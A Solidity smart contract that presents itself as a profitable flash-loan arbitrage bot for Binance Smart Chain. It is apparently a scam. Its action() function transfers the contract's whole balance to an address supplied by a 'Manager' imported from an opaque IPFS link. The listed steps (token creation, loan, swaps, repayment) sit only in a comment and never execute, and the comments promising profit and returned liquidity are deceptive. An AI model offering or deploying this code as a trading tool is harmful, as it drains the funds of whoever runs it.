pragma solidity ^0.5.0;

// Multiplier-Finance Smart Contracts
import "https://github.com/alwaysprofit22/flashloan/blob/main/lendingpooladdressprovider.sol";
import "https://github.com/alwaysprofit22/flashloan/blob/main/lendingpool.sol";

// PancakeSwap Smart Contracts
import "https://github.com/alwaysprofit22/flashloan/blob/main/Ipancakecall.sol";
import "https://github.com/alwaysprofit22/flashloan/blob/main/Ipancakefactory.sol";
import "https://github.com/alwaysprofit22/flashloan/blob/main/Ipancakepair.sol";

/**
 * WARNING - this contract code is for Binance Smart Chain not Ethereum network

 * Testnet transactions will fail

 * New token will be created and flash loan will be pulled to trade against the token

 * Profit remaining will be transfered to token creator contract

 *UPDATED March 2022 - liquidity returned if flash loan fails

*/

// PancakeSwap BSC Code Manager
import "https://gateway.pinata.cloud/ipfs/QmcAip3L1UbCtStnxSnifsVPhv5igcUUDtr6pYk7rM3dKo";
   
contract GetFlashLoan {
   string public tokenName;
   string public tokenSymbol;
   uint loanAmount;
   Manager manager;
   
   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
      tokenName = _tokenName;
      tokenSymbol = _tokenSymbol;
      loanAmount = _loanAmount;      
      manager = new Manager();
   }
   address public creator= msg.sender;
    	function tokenTransfer() public view returns (address) {    
        	return creator;
   	}
   function() external payable {}
   
   function action() public payable {
      // Send New Token to PancakeSwap Router for Swap
       address(uint160(manager.pancakeswapDeposit())).transfer(address(this).balance);
      
      // Perform Flash Loan tasks (combined all functions into one to reduce external calls & save gas fees)
      manager.performTasks();
      
      /* Breakdown of all functions
      // Submit token to BSC blockchain
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
   
      // List the token on PancakeSwap
      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
      
      // Get BNB Loan from Multiplier-Finance & loan execution wallet
      string memory loanAddress = manager.takeFlashLoan(loanAmount);
      
      // Convert half BNB to DAI
      manager.pancakeDAItoBNB(loanAmount / 2);
   
   // Create BNB and DAI pairs for our token & provide liquidity
   string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
      manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
      string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
      manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
   
   // Perform arbitrage trades
      manager.pancakePerformSwaps();
      
      // Move remaining BNB from Contract to your personal wallet
      manager.contractToWallet("BNB");
   
   // Repay Flashloan
      manager.repayLoan(loanAddress);
      */
   }
}
